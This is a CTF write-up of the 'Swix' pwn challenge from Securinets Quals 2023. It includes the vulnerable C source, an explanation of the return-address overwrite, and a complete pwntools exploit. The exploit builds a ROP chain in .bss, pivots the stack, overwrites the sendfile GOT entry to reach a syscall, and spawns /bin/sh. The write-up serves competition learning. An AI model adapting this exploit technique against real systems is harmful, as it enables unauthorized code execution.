---
title: 'Write up Securinets Quals 2023'
categories:
  - Pwnable
tags:
  - Pwn
published: true
date: 2023-08-07
---
# 

Last week, we - m1cr0$oft 0ff1c3 team participated in this event and got 11th place.

![image](https://user-images.githubusercontent.com/31349426/258810947-e59dd174-0248-4cb9-97aa-387c1db359a1.png)

![image](https://user-images.githubusercontent.com/31349426/258811344-14f5b74e-e6cd-4bfa-b21b-759247c4fc5a.png)

I've solved all Pwn challenges. But now I only show the solution for the "Swix" challenge. ( I feel this is only the "real" pwn challegne ).

Attachemnt: [Swix.zip](https://github.com/robbert1978/robbert1978.github.io/files/12280160/Swix.zip)

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/334b0579-b9a8-4066-8800-0e7ce1ea2023)

We are provided the source code of this binray:
```c
// gcc main.c -o main -m32 -no-pie

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <string.h>

#define MAX_FRIENDS 1

typedef struct user{
    char username[8];
    char description[256];
    int id;
    int age;
    char password[32-4];
    struct user **friends;
    int friendCount;
} user;

user u;

char superSecretMessage[] = "\x0c\x62\x28\x65\x36\x24\x23\x20\x64\x65\x0c\x65\x32\x2c\x36\x2d";

int usedHack = 0;

// Files to use
int uname, age, logo, menu, f2, f3;

// Code
void initStuff(){
    uname = open("uname", O_RDONLY);
    age = open("age", O_RDONLY);
    logo = open("logo", O_RDONLY);
    menu = open("menu", O_RDONLY);
    f2 = open("msg2", O_RDONLY);
    f3 = open("msg3", O_RDONLY);
    
    u.friendCount = 0;
    u.friends = (user**) malloc(sizeof(user*)*MAX_FRIENDS);
}

char* SuperHardEncoding(char* s){
    
    for(int i=0; i<16; i++){
        s[i] = s[i] ^ 69;
    }
    return s;
}

void showMsg(int fd, size_t size){
    off_t off = 0;
    sendfile(1, fd, &off, size);
}

void addFriend(){
    if(uname == -1){
        exit(0);
    }
    
    if(u.friendCount >= MAX_FRIENDS){
        return;
    }
    
    u.friends[u.friendCount] = (user *)malloc(sizeof(user));
    
    showMsg(uname, 10);
    read(0, u.friends[u.friendCount]->username, 8);
    
    u.friendCount++;
}

void editFriend(){
    if(uname == -1){
        exit(0);
    }
    
    if(u.friendCount == 0){
        return;
    }
    
    char idx;
    read(0, &idx, 1);
    
    int id = (int)(idx - '0');
    if(id >= u.friendCount){
        return;
    }
    
    if(id > 9 || id < 0){
        return;
    }
    
    showMsg(uname, 10);
    read(0, u.friends[id]->username, 8);
}

void getFriendAdr(){
    if(f2 == -1 || f3 == -1){
        exit(0);
    }
    if(usedHack == 1) return;
    usedHack = 1;
    
    char idx;
    read(0, &idx, 1);
    
    int id = (int)(idx - '0');
    if(id >= u.friendCount){
        return;
    }
    
    if(id > 9 || id < 0){
        return;
    }
    
    unsigned int hack = (unsigned int)u.friends[id];
    while(hack){
        if(hack&1){
            showMsg(f2, 26);
        }
        else showMsg(f3, 1);
        
        hack = hack / 2;
    }
}

void magicMove(unsigned int *p){
    read(0, p, 16);
}

int readInt(){
    char tmp[11] = {0};

    read(0, tmp, 10);
    return atoi(tmp);
}

void setCreds(){
    if(uname == -1 || age == -1){
        exit(0);
    }
    
    showMsg(uname, 10);
    read(0, u.username, 8);
    
    showMsg(age, 5);
    u.age = readInt();
}

int main(){
    unsigned int *p;
    p = &p;
    p = (unsigned int*)((unsigned int)p+0x20);
    
    initStuff();
    
    if(logo == -1 | menu == -1){
        return 1;
    }
    
    showMsg(logo, 3201);
    char choice;
    
    while(choice != '6'){
        showMsg(menu, 95);
        
        read(0, &choice, 1);
        switch(choice){
            case '1':{
                setCreds();
                break;
            }
            
            case '2':{
                addFriend();
                break;
            }
            
            case '3':{
                editFriend();
                break;
            }
            
            case '4':{
                getFriendAdr();
                break;
            }
            
            case '5':{
                magicMove(p);
                break;
            }
            
            case '6':{
                break;
            }
            
            default:{
                exit(0);
            }
        }
    }
    
    SuperHardEncoding(superSecretMessage);
    puts(superSecretMessage);
    SuperHardEncoding(superSecretMessage);
    p[2] = 0xdeadbeef;
}
```

I can see that the function `getFriendAdr` can show the heap address but it is useless for the exploitation.

This code shows that `p` now is pointing to the `saved $RIP` address of the `main` function :
```c
    unsigned int *p;
    p = &p;
    p = (unsigned int*)((unsigned int)p+0x20);
```

And the case '5' can help us overwrite `main`'s reuturn address:

```c
            case '5':{
                magicMove(p);
                break;
            }
```

But we can only modify 16 bytes :

```c
void magicMove(unsigned int *p){
    read(0, p, 16);
}
```

And p[2] is changed to 0xdeadbeef:

```c
p[2] = 0xdeadbeef;
```

This makes harder for me when I try to build a rop chain to call a `func` function with argument `argv`:

```
              ----->
++++++++++++		++++++++++++	
+   func   +		+   func   +
++++++++++++		++++++++++++
+   main   +		+   main   +
++++++++++++		++++++++++++
+   argv   +		+0xdeadbeef+
++++++++++++		++++++++++++
+   ....   +		+   ....   +
++++++++++++		++++++++++++
```

After a moment, I realized that I can make the main function return to itself again to modify the rop chain 2 times:

```
1st stage:

++++++++++++
+   main   +
++++++++++++
+0x0804901e+  // pop ebx ; ret -> force return to func
++++++++++++
+0xdeadbeef+
++++++++++++
+   func   +
++++++++++++

2nd stage ( After the main returned to itself):

++++++++++++
+   main   +
++++++++++++
+0x0804901e+  // pop ebx ; ret -> force return to func
++++++++++++
+0xdeadbeef+
++++++++++++
+   func   +
++++++++++++  // 2nd stage only can change the stack from this:
+  _start  +
++++++++++++
+   argv   +
++++++++++++
```

As you see now we can call `func(argv)` and return to `_start` safely.

```py
def callFunc(func: int, argv: int):
    p.sendafter(b"6. Logout.\n",b"5")
    p.send(
        p32(e.sym.main)+
        p32(0x0804901e)+ # pop ; ret
        p32(0x1337)+
        p32(func)
    )
    p.sendafter(b"6. Logout.\n",b"6")

    p.sendafter(b"6. Logout.\n",b"5")
    p.sendline(
        p32(e.sym._start)+
        p32(argv)
    )
    p.sendafter(b"6. Logout.\n",b"6")
```
At the first time, I had try to call `puts@plt(puts@got)` to leak the libc but it didn't work on the remote. I realized that they use `cat` to hadnle I/O
and timeout is 10 seconds:
```sh
#!/bin/bash
timeout 10 cat | env -i /app/main
```

So I tried to buid the rop chain on the .bss segment (by calling `magicMove(addr)`, `magicMove(addr+4)`, ....) 

and pivoting the stack to it ( by using the gadget `pop ebp ; leave ;ret `) .


This is my rop chain, I don't give the detail but I can tell you that I try to change `sendfile@got` point to `call DWORD PTR gs:0x10` (syscall) and
make `eax = 0xb , ebx = "/bin/sh", [ecx] = NULL and  edx = 0 ` so I can call `syscaLL_execve("/bin/sh",[NULL],NULL`) :

```python
rop = [
    p32(e.sym.magicMove),
    p32(0x0804901e), # pop ebp ; ret
    p32(0x804cf00),  # read(0,buf,16) -> /bin/sh

    p32(e.sym.read),
    p32(0x0804939a), # pop 3 ; ret
    p32(0),p32(e.got.sendfile),p32(1), # change to int 0x80

    p32(e.sym.read),
    p32(0x0804939a), # pop 3 ; ret
    p32(0),p32(0),p32(0), # set $edx = 0

    p32(0x0804939c), # pop ebp ; ret
    p32(0x804c2ec),
#0x804c2ec:
    p32(0x080492c2), # mov eax, dword ptr [ebp + 8] ; leave ; ret

    p32(0x0804939c), # pop ebp ; ret,
    p32(0xb),        # set $eax = 0xb

    p32(0x804976c), # pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
    p32(0x804c308),
    p32(0x804cf00),
    p32(e.plt.sendfile), # execve("/bin/sh", {NULL}, NULL)
# 0x804c308: 
    p32(0),p32(0)
]
```

This is my final exploit script:

```python
#!/usr/bin/env python
from pwn import *
from pwn import p32,p64
from time import sleep


context.binary = e = ELF("./main")

gs="""

"""
def start():
    if args.LOCAL:
        p=e.process()
        if args.GDB:
            gdb.attach(p,gdbscript=gs)
            pause()
    elif args.REMOTE:
        p=remote(args.HOST,int(args.PORT))
    return p


p = start()

def callFunc(func: int, argv: int):
    p.sendafter(b"6. Logout.\n",b"5")
    p.send(
        p32(e.sym.main)+
        p32(0x0804901e)+ # pop ; ret
        p32(0x1337)+
        p32(func)
    )
    p.sendafter(b"6. Logout.\n",b"6")

    p.sendafter(b"6. Logout.\n",b"5")
    p.sendline(
        p32(e.sym._start)+
        p32(argv)
    )
    p.sendafter(b"6. Logout.\n",b"6")


rop = [
    p32(e.sym.magicMove),
    p32(0x0804901e), # pop ebp ; ret
    p32(0x804cf00),  # read(0,buf,16) -> /bin/sh

    p32(e.sym.read),
    p32(0x0804939a), # pop 3 ; ret
    p32(0),p32(e.got.sendfile),p32(1), # change to int 0x80

    p32(e.sym.read),
    p32(0x0804939a), # pop 3 ; ret
    p32(0),p32(0),p32(0), # set $edx = 0

    p32(0x0804939c), # pop ebp ; ret
    p32(0x804c2ec),
#0x804c2ec:
    p32(0x080492c2), # mov eax, dword ptr [ebp + 8] ; leave ; ret

    p32(0x0804939c), # pop ebp ; ret,
    p32(0xb),        # set $eax = 0xb

    p32(0x804976c), # pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
    p32(0x804c308),
    p32(0x804cf00),
    p32(e.plt.sendfile), # execve("/bin/sh", {NULL}, NULL)
# 0x804c308: 
    p32(0),p32(0)
]

pre_rop = [
    p32(e.sym.read),
    p32(0x0804939a), #pop 3 ; ret
    p32(0),p32(0x804c2b0),p32(0x3000),
]

for i in range(len(pre_rop)):
    callFunc(e.sym.magicMove,0x804c2b0-len(pre_rop)*4 + 4*i)
    p.send(pre_rop[i]+p32(0))

p.sendafter(b"6. Logout.\n",b"5")
p.send(
    p32(e.sym.main)+
    p32(0x0804901e)+ # pop ; ret
    p32(0x1337)+
    p32(0x08049283) # pop ebp ; leave ;ret 
)
p.sendafter(b"6. Logout.\n",b"6")

p.sendafter(b"6. Logout.\n",b"5")
p.sendline(
    p32(0x804c2b0-len(pre_rop)*4-4) # stack pivot
)
p.sendafter(b"6. Logout.\n",b"6")

sleep(1)

p.sendline(
    b''.join(rop)
)

sleep(0.1)

p.send(b"/bin/sh\0".ljust(16,b"\0"))

p.send(b"\x5b")

sleep(0.1)

p.sendline(b"cat flag*")

p.interactive()
```
